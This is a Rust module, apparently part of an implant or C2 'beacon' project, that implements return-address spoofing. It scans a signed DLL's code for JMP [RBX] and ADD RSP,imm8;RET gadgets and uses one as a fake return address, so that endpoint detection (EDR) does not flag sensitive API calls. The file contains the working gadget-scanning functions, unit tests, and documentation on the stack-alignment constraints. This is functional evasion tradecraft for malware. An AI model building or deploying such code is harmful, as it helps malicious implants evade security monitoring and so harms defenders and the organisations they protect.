//! Return-address spoofing: the gadget scan (port of the original project's
//! `FF 23` search and its `ADD RSP, imm8; RET` fallback).
//!
//! EDR inspects the return address on sensitive API calls: if it points into
//! unbacked or private executable memory, the call is flagged. The harness
//! (beacon crate) pushes a gadget address found inside a signed DLL as the
//! fake return address, so the API appears to be called from that module.
//!
//! Two gadget kinds:
//!
//! - `FF 23` (`JMP [RBX]`): the API's RET lands on the gadget, which jumps
//!   through RBX (callee-saved, so the continuation address it holds
//!   survives the whole call) back into the beacon.
//! - `48 83 C4 imm8; C3` (`ADD RSP, imm8; RET`): the RET chain pops down to
//!   the beacon's ORIGINAL return-address slot (the landing is not a copy:
//!   the final stack pointer comes back exactly one slot above entry, like
//!   a normal call). The gadget slot must sit `imm + 8` bytes below that
//!   original slot, so the API entry stack is misaligned unless
//!   `imm ≡ 8 (mod 16)` — the scan only accepts that parity. Even-`imm`
//!   gadgets (0x20, 0x40…) are skipped; that is structural, not cosmetic
//!   (the original project's asm does not actually handle them either —
//!   its landing works only for the one imm8 matching its frame).

/// `jmp qword ptr [rbx]`.
pub const JMP_RBX: [u8; 2] = [0xFF, 0x23];

/// `add rsp, imm8 ; ret` opcode bytes around the imm8.
pub const ADD_RSP_RET: [u8; 5] = [0x48, 0x83, 0xC4, 0x00, 0xC3];
/// Offset of the imm8 inside [`ADD_RSP_RET`].
pub const ADD_RSP_IMM_OFF: usize = 3;

/// First `JMP [RBX]` offset within a byte slice (a module's `.text`), or
/// `None`. The scan is bounded by the slice — no unbounded walks.
#[inline]
pub fn find_jmp_rbx(text: &[u8]) -> Option<usize> {
    if text.len() < 2 {
        return None;
    }
    let mut i = 0;
    while i + 1 < text.len() {
        if text[i] == JMP_RBX[0] && text[i + 1] == JMP_RBX[1] {
            return Some(i);
        }
        i += 1;
    }
    None
}

/// First `ADD RSP, imm8; RET` offset and its imm8, or `None`. Only
/// `imm ≡ 8 (mod 16)` gadgets are accepted (the API-entry alignment of the
/// beacon harness — see the module docs); zero imm is rejected as it is a
/// plain `RET` with no stack effect.
#[inline]
pub fn find_add_rsp_ret(text: &[u8]) -> Option<(usize, u8)> {
    if text.len() < ADD_RSP_RET.len() {
        return None;
    }
    let mut i = 0;
    while i + ADD_RSP_RET.len() <= text.len() {
        if text[i] == ADD_RSP_RET[0]
            && text[i + 1] == ADD_RSP_RET[1]
            && text[i + 2] == ADD_RSP_RET[2]
            && text[i + 4] == ADD_RSP_RET[4]
        {
            let imm = text[i + ADD_RSP_IMM_OFF];
            if imm != 0 && imm % 16 == 8 {
                return Some((i, imm));
            }
        }
        i += 1;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_the_gadget() {
        let text = [0u8, 1, 0xFF, 0x23, 9, 0xFF, 0x23];
        assert_eq!(find_jmp_rbx(&text), Some(2));
    }

    #[test]
    fn first_hit_wins() {
        let text = [0xFF, 0x23, 0, 0xFF, 0x23];
        assert_eq!(find_jmp_rbx(&text), Some(0));
    }

    #[test]
    fn no_gadget_returns_none() {
        assert_eq!(find_jmp_rbx(&[0u8; 64]), None);
        assert_eq!(find_jmp_rbx(&[]), None);
        assert_eq!(find_jmp_rbx(&[0xFF]), None);
        assert_eq!(find_jmp_rbx(&[0xFF, 0x24]), None);
    }

    #[test]
    fn gadget_at_the_very_end_is_found() {
        let text = [1, 2, 3, 0xFF, 0x23];
        assert_eq!(find_jmp_rbx(&text), Some(3));
    }

    /// The ADD RSP fallback: odd multiples of 8 land, everything else is
    /// skipped and the scan continues (the accepted-parity rule).
    #[test]
    fn finds_add_rsp_ret() {
        // add rsp, 0x18 ; ret
        let text = [0x48, 0x83, 0xC4, 0x18, 0xC3];
        assert_eq!(find_add_rsp_ret(&text), Some((0, 0x18)));
    }

    #[test]
    fn add_rsp_scan_continues_past_rejected_parities() {
        // 0x20 (even) rejected, 0x00 (plain ret) rejected, 0x38 accepted.
        let text = [
            0x48, 0x83, 0xC4, 0x20, 0xC3, //
            0x48, 0x83, 0xC4, 0x00, 0xC3, //
            0x48, 0x83, 0xC4, 0x38, 0xC3,
        ];
        assert_eq!(find_add_rsp_ret(&text), Some((10, 0x38)));
    }

    #[test]
    fn add_rsp_no_match_returns_none() {
        assert_eq!(find_add_rsp_ret(&[]), None);
        assert_eq!(find_add_rsp_ret(&[0u8; 8]), None);
        // Wrong opcode / no trailing ret.
        assert_eq!(find_add_rsp_ret(&[0x48, 0x83, 0xC4, 0x18, 0x90]), None);
        // Truncated tail.
        assert_eq!(find_add_rsp_ret(&[0x48, 0x83, 0xC4]), None);
    }

    #[test]
    fn add_rsp_at_the_very_end_is_found() {
        let text = [1, 2, 3, 4, 5, 0x48, 0x83, 0xC4, 0x28, 0xC3];
        assert_eq!(find_add_rsp_ret(&text), Some((5, 0x28)));
    }
}
